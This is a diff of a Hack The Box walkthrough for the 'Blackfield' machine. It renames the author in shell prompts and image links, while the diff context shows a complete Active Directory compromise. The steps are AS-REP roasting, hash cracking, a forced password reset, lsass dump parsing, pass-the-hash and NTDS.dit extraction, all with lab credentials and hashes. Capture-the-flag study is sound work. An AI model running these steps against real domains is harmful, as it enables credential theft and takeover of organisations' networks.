@@ -9,6 +9,7 @@ avatar: assets/htb/blackfield.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Blackfield
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -18,7 +19,7 @@ I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regular
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ nmap -n -v -p- -sCV -oA blackfield <YOUR_IP> -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 11:28 EDT
 NSE: Loaded 151 scripts for scanning.
@@ -100,7 +101,7 @@ Nmap done: 1 IP address (1 host up) scanned in 290.20 seconds
 Since port 445 \(SMB\) is open I tried to enumerate open shares by using anonymous login
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ crackmapexec smb <YOUR_IP> -u '' --shares
 SMB         <YOUR_IP>    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 SMB         <YOUR_IP>    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
@@ -109,7 +110,7 @@ SMB         <YOUR_IP>    445    DC01             [-] Error enumerating shares: S
 with crackmapexec was unable to get any shares without a username, but I'm not sure if you can do anonymous login with this program so I tried with the standard smbclient as well
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ smbclient -U "" -L \\\\<YOUR_IP>\\       
 Enter WORKGROUP\'s password: 
 
@@ -128,7 +129,7 @@ SMB1 disabled -- no workgroup available
  with smbclient got a list of shares!
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ smbclient -U ""  \\\\<YOUR_IP>\\forensic
 Enter WORKGROUP\'s password: 
 Try "help" to get a list of possible commands.
@@ -139,7 +140,7 @@ NT_STATUS_ACCESS_DENIED listing \*
 I was able to login to the `forensic` share anonymously but was not allowed to do much
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ smbclient -U ""  \\\\<YOUR_IP>\\profiles$
 Enter WORKGROUP\'s password: 
 Try "help" to get a list of possible commands.
@@ -469,7 +470,7 @@ Trying again with the `profiles$` share yielded a lot more information! I took a
 I tried using Metasploit's `auxiliary(gather/kerberos_enumusers)` Kerberos user enumeration tool, however I just got an error for each user saying `[*] <YOUR_IP>:88 - Wrong DOMAIN Name? Check DOMAIN and retry...`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ rpcclient -U "" -N  <YOUR_IP>                                                                1 ⨯
 rpcclient $> enumdomusers
 result was NT_STATUS_ACCESS_DENIED
@@ -482,10 +483,10 @@ After trying numerous commands, I was able to at least verify that blackfield wa
 since the module in msfconsole didn't I decided to try the python-based Impacket script `GetNPUsers.py` which does the same type of check to see if any users have `UF_DONT_REQUIRE_PREAUTH` turned off.
 
 ```text
-┌──(zweilos㉿kali)-[~/impacket/examples]
+┌──(kac0㉿kali)-[~/impacket/examples]
 └─$ python3 ./GetNPUsers.py blackfield/ -no-pass -usersfile ~/htb/blackfield/usernames -dc-ip <YOUR_IP> > kerberosEnum
 
-┌──(zweilos㉿kali)-[~/impacket/examples]
+┌──(kac0㉿kali)-[~/impacket/examples]
 └─$ cat kerberosEnum | grep -v UNKNOWN   
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
@@ -497,7 +498,7 @@ $krb5asrep$23$support@BLACKFIELD:fd014a8905a07be16b91d57562b70a97$41d550ea1cde13
 I found three users that had this turned off, and one even had the password hash attached! Time to fire up hashcat.
 
 ```text
-┌──(zweilos㉿kali)-[~/impacket/examples]
+┌──(kac0㉿kali)-[~/impacket/examples]
 └─$ hashcat --help | grep -i kerberos                                                               1 ⨯
    7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
   13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
@@ -507,7 +508,7 @@ I found three users that had this turned off, and one even had the password hash
   19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
   19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
 
-┌──(zweilos㉿kali)-[~/impacket/examples]
+┌──(kac0㉿kali)-[~/impacket/examples]
 └─$ hashcat -O -D1,2 -a0 -m 18200 support.hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.1.1) starting...
 
@@ -546,7 +547,7 @@ After searching for the correct hash type I fired up hashcat and very quickly cr
 ## Road to User
 
 ```text
-┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
+┌──(kac0㉿kali)-[/usr/share/neo4j/conf]
 └─$ crackmapexec smb <YOUR_IP> -u support -p '#00^BlackKnight' --shares
 SMB         <YOUR_IP>    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 SMB         <YOUR_IP>    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
@@ -567,14 +568,14 @@ The user `support` could view the same shares as I could see anonymously. Next I
 I connected to each of the three shares: `profiles$` still had the same empty user directories, `NETLOGON` was completely empty, while `SYSVOL` only had a few files, none of which contained anything useful.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -h <YOUR_IP> -s sub -L -b "dc=BLACKFIELD,dc=LOCAL" > blackfield.LDAP
 ```
 
 I ran `ldapsearch` next to see if I could get any more information than before, and a mountain of data returned. \(I also made the mistake of not sending the output to a file the first time and my screen exploded\). Unfortunately, there was nothing new or useful in all of that the output \(besides a slew of anonymous sounding usernames such as blackfield123456, etc.\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -ns <YOUR_IP>
 INFO: Found AD domain: blackfield.local
 INFO: Connecting to LDAP server: dc01.blackfield.local
@@ -593,15 +594,15 @@ INFO: Done in 00M 10S
 
 With so many users to go off and no way to directly tell what rights I had with the user `support` I loaded bloodhound up to see if it could sniff me a path forward. The python version of bloodhound allows it to be run against a remote host with credentials, and outputs a few `.json` files that I imported into the main program.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-bloodhound-stats.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-bloodhound-stats.png)
 
 Bloodhound reported 342 \(!\) users on this domain. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-bloodhound-targets.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-bloodhound-targets.png)
 
 Most of them were named generically `BLACKFIELD123456`, however there were a few that stuck out. I set these as my targets and began looking for ways to link them. Since I already had the credentials for `support` I marked that user as 'owned' and proceeded to see what I could do with its access.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-bloodhound-forcepassword.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-bloodhound-forcepassword.png)
 
 Since `support` has the `ForceChangePassword` privilege over the user `audit2020` I looked up how to change a user's password via SMB and found: [https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/](https://www.dark-hamster.com/operating-system/linux/ubuntu/reset-samba-user-password-via-command-line/)
 
@@ -611,14 +612,14 @@ This site showed that using rpcclient with the syntax `rpcclient $> setuserinfo2
 
 3 pictures
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1.1-rpcclient-info.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.1-rpcclient-info.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1.2-rpcclient-info2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.2-rpcclient-info2.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1.3-rpcclient-info3.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.3-rpcclient-info3.png)
 
 ```text
-┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
+┌──(kac0㉿kali)-[/usr/share/neo4j/conf]
 └─$ rpcclient -U BLACKFIELD/support <YOUR_IP>
 Enter BLACKFIELD\support's password: 
 rpcclient $> enumdomusers
@@ -641,12 +642,12 @@ password_properties: 0x00000001
 rpcclient $> setuserinfo audit2020 23 TestPass!23
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1.3-net-password.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.3-net-password.png)
 
 I also tried doing it the 'easy' way with the one-liner from the bottom of the blog post and successfully changed it with the `net` command. I'll definitely have to remember that I can use `net` commands from Linux in the future!
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ net rpc password audit2020 -U support -S <YOUR_IP>  
 Enter new password for audit2020:
 Enter WORKGROUP\support's password:
@@ -655,7 +656,7 @@ Enter WORKGROUP\support's password:
 now that I had a usable password for another user I set out to see what I could get into. I was unable to use WinRM or get anything further from rpcclient, so I went back to enumerating the open SMB shares.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ smbclient -W BLACKFIELD -U "audit2020"  \\\\<YOUR_IP>\\forensic 'TestPass!23'
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -732,7 +733,7 @@ smb: \tools\> ls
 ```
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ pypykatz lsa minidump lsass.DMP | tee blackfieldCreds                                                 
 INFO:root:Parsing file lsass.DMP
 FILE: ======== lsass.DMP =======
@@ -810,20 +811,20 @@ luid 153705
 ran mimikatz - python edition \(`pypykatz`\) on the lssas.DMP file, then pulled out the usernames, passwords, and hashes
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ cat blackfieldCreds | grep -i username | cut -d '"' -f4 |sort | uniq >> usernames 
 
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ cat blackfieldCreds | grep -i password | cut -d '"' -f4 |sort | uniq >> passwords
 
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ cat blackfieldCreds | grep -i nthash | cut -d '"' -f4 |sort | uniq >> hashes
 ```
 
 I tried cracking the NTLM hashes with `hashcat` but even using all of the various rules and some basic mangles I was unsiccessful. Luckily since this is Windows domain I can try to do a pass-the-hash attack instead.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ crackmapexec smb <YOUR_IP> -u targets -H hashes -o cme.status   
 SMB         <YOUR_IP>    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 SMB         <YOUR_IP>    445    DC01             [-] BLACKFIELD.local\Administrator 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
@@ -840,7 +841,7 @@ It didn't take long to find a valid combination. The password \(hash\) for `svc_
 ### Finding user creds
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ evil-winrm -i <YOUR_IP> -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
 
 Evil-WinRM shell v2.3
@@ -907,7 +908,7 @@ Mode                LastWriteTime         Length Name
 -ar---        10/3/2020   2:56 PM             34 user.txt
 
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
-5836****6fcf
+5836************************6fcf
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -971,7 +972,7 @@ So the "audit report" \(root.txt\) is encrypted. That would explain why it canno
 will try `wbadmin.exe` to backup files and try to backup to local share rather than trying to exfil later
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ sudo smbserver.py share . -smb2support -username test -password test   
 
 Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
@@ -1128,7 +1129,7 @@ Next I saved each of the registry hives and downloaded all of the files. Unfortu
 ### Getting a shell
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ secretsdump.py -system system.hive -sam sam.hive -ntds NTDS.dit LOCAL | tee blackfield.hashes
 
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -1150,7 +1151,7 @@ support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::
 Using Impacket's `secretsdump.py` I was able to dump the password hashes for all of the domain users \(including the 300+ Blackfield123456 users!\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/blackfield]
+┌──(kac0㉿kali)-[~/htb/blackfield]
 └─$ evil-winrm -i <YOUR_IP> -u administrator -H 184fb5e5178480be64824d4cd53b99ee                1 ⨯
 
 Evil-WinRM shell v2.3
@@ -1239,6 +1240,6 @@ Info: Download successful!
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-c1cb****2e83
+c1cb************************2e83
 *Evil-WinRM* PS C:\Users\Administrator\Desktop>
 ```
